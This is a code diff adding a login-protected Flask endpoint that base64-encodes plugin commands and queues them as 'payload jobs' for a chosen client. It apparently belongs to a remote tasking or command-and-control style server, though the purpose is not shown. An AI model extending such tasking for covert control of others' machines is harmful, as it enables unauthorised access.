@@ -2302,6 +2302,38 @@ def activatePlugin(pluginId):
     return jsonify({"status": "activated", "pluginId": pluginId}), 200
 
 
+@app.route('/api/plugins/<pluginId>/command', methods=['POST'])
+@login_required
+def sendPluginCommand(pluginId):
+    """Send a command to a running plugin on a client."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+
+    content = request.json
+    clientID = content.get('clientID')
+    command = content.get('command', {})
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    taskData = {
+        "type": "PLUGIN_COMMAND",
+        "pluginId": pluginId,
+        "command": command
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "queued", "pluginId": pluginId}), 200
+
+
 @app.route('/api/plugins/<pluginId>/deactivate', methods=['POST'])
 @login_required
 def deactivatePlugin(pluginId):
